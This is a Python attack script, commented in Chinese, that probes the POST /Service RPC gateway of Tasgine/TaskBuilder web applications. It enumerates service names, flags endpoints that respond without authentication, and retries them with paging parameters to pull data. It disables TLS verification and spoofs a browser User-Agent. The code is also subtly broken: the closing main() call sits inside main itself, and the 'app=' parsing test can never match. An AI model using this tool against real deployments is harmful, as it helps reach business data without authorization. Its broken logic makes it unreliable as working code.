#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tasgine / TaskBuilder 单一 RPC 网关 POST /Service 的服务端点枚举器
适用：标题含 "Tasgine Shared Edition x.x.x"、任意不存在路径返回 "请求地址无效！" 的目标
判据三分法：
  code:3   -> 服务存在且【无需鉴权】(参数缺失)  ← 目标
  code:501 -> 服务存在但需鉴权
  code:500 -> 服务不存在（错误消息会回显拼接后的绝对路径，可用于确认映射）
用法：python3 tasgine_enum.py https://TARGET ENUMS.txt
"""
import json, sys, time, ssl, urllib.request
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '用法：python3 tasgine_enum.py https://TARGET ENUMS.txt'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----


def call(base, body, timeout=15):
    data = json.dumps(body).encode()
    req = urllib.request.Request(base.rstrip('/') + "/Service", data=data, headers={
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    })
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        return urllib.request.urlopen(req, timeout=timeout, context=ctx).read().decode('utf-8', 'replace')
    except Exception as e:
        return "ERR:%s" % e

def classify(txt):
    if '"code":3' in txt:   return "PREAUTH"     # 存在 + 无需鉴权
    if '"code":501' in txt: return "AUTH-REQ"    # 存在 + 需鉴权
    if '"code":500' in txt: return "NOTFOUND"
    if '"code":0' in txt:   return "OK-DATA"     # 直接返回业务数据（最好情况）
    return "OTHER"

def main():
    base = sys.argv[1]
    apps = ["sys"]
    svcs = []
    if len(sys.argv) > 2:
        for line in open(sys.argv[2], encoding='utf-8'):
            line = line.strip()
            if not line or line.startswith('#'): continue
            if ':' in line.split('/')[0] and line.startswith('app='):
                apps.append(line.split('=', 1)[1]); continue
            svcs.append(line)
    for app in apps:
        print("=== app=%s  (映射 /app/%s/service/<svc>.js) ===" % (app, app))
        for s in svcs:
            txt = call(base, {"app": app, "service": s})
            tag = classify(txt)
            mark = "  <<< 未鉴权可调用" if tag in ("PREAUTH", "OK-DATA") else ""
            print("[%-8s] %-40s %s%s" % (tag, s, txt[:140], mark))
            if tag == "PREAUTH":
                # 带最简参数再看一次，区分是"参数缺失"还是"真能取数"
                txt2 = call(base, {"app": app, "service": s, "pageIndex": 1, "pageSize": 1})
                print("           +params -> %s" % txt2[:200])
            time.sleep(float(sys.argv[3]) if len(sys.argv) > 3 else 3)

    main()
